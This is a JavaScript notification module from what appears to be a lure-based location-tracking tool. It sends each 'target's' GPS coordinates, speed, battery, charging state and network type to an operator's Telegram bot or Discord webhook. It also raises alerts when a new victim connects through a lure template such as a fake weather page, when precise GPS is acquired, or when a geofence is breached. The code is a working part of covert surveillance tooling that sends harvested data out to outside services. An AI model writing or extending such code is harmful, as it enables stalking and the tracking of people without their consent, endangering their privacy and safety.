// Notification Service for Telegram & Discord Webhooks
const db = require("./db")

// Throttle map so we don't spam webhooks on 4-second intervals
const lastNotified = {}

class Notifier {
    async sendTargetAlert(target, eventType = "update") {
        const settings = db.getSettings()
        const tgToken = settings.telegramBotToken
        const tgChatId = settings.telegramChatId
        const discordWebhook = settings.discordWebhookUrl

        if (!tgToken && !discordWebhook) {
            return // No notifications configured
        }

        const now = Date.now()
        const lastTime = lastNotified[target.id] || 0
        const isImportant = eventType === "connect" || eventType === "gps_acquired" || eventType === "geofence_breach"

        // Rate limit regular position updates to at most once per 60 seconds per target
        if (!isImportant && (now - lastTime) < 60000) {
            return
        }
        lastNotified[target.id] = now

        const gmapsUrl = `https://www.google.com/maps?q=${target.lat},${target.lng}`
        const timeStr = new Date(target.lastSeen || now).toLocaleTimeString()
        const accuracyStr = target.accuracy ? `±${Math.round(target.accuracy)}m` : "Unknown"
        const speedStr = target.speed != null && target.speed > 0 ? `${(target.speed * 3.6).toFixed(1)} km/h` : "Stationary"
        const batteryStr = target.battery != null ? `${Math.round(target.battery)}%${target.charging ? ' ⚡' : ''}` : "N/A"
        const networkStr = target.network || "Unknown"
        const lureStr = target.lure || "Weather"

        let title = "📍 Target Location Update"
        if (eventType === "connect") title = "🚀 New Target Connected!"
        else if (eventType === "gps_acquired") title = "🎯 Precise GPS Acquired!"
        else if (eventType === "geofence_breach") title = "⚠️ GEOFENCE BREACH DETECTED!"

        // 1. Send Telegram Notification
        if (tgToken && tgChatId) {
            const tgMessage = `*${title}*\n\n` +
                `👤 *Target ID:* \`${target.id}\`\n` +
                `🎭 *Lure Template:* ${lureStr}\n` +
                `📡 *Signal Type:* ${target.type || 'GPS'} (${accuracyStr})\n` +
                `🏎️ *Speed:* ${speedStr}\n` +
                `🔋 *Battery:* ${batteryStr} | 📶 *Net:* ${networkStr}\n` +
                `🕒 *Time:* ${timeStr}\n\n` +
                `🗺️ [Open in Google Maps](${gmapsUrl})`

            try {
                await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: tgChatId,
                        text: tgMessage,
                        parse_mode: "Markdown",
                        disable_web_page_preview: false
                    })
                })
            } catch (err) {
                console.warn("[Telegram Notifier Error]:", err.message)
            }
        }

        // 2. Send Discord Webhook Notification
        if (discordWebhook && discordWebhook.startsWith("http")) {
            const embedColor = eventType === "geofence_breach" ? 0xef4444 : (eventType === "connect" ? 0x22c55e : 0x0284c7)
            const discordPayload = {
                username: "Live Location Tracker",
                avatar_url: "https://img.icons8.com/color/96/satellite-sending-signal.png",
                embeds: [
                    {
                        title,
                        url: gmapsUrl,
                        color: embedColor,
                        fields: [
                            { name: "Target ID", value: `\`${target.id}\``, inline: true },
                            { name: "Template", value: lureStr, inline: true },
                            { name: "Coordinates", value: `${target.lat.toFixed(5)}, ${target.lng.toFixed(5)}`, inline: true },
                            { name: "Accuracy", value: accuracyStr, inline: true },
                            { name: "Speed", value: speedStr, inline: true },
                            { name: "Battery", value: batteryStr, inline: true },
                            { name: "Network", value: networkStr, inline: true },
                            { name: "Type", value: target.type || "GPS", inline: true },
                            { name: "Google Maps", value: `[View on Map](${gmapsUrl})`, inline: false }
                        ],
                        footer: { text: `Tracker Alert • ${timeStr}` }
                    }
                ]
            }

            try {
                await fetch(discordWebhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(discordPayload)
                })
            } catch (err) {
                console.warn("[Discord Notifier Error]:", err.message)
            }
        }
    }
}

module.exports = new Notifier()
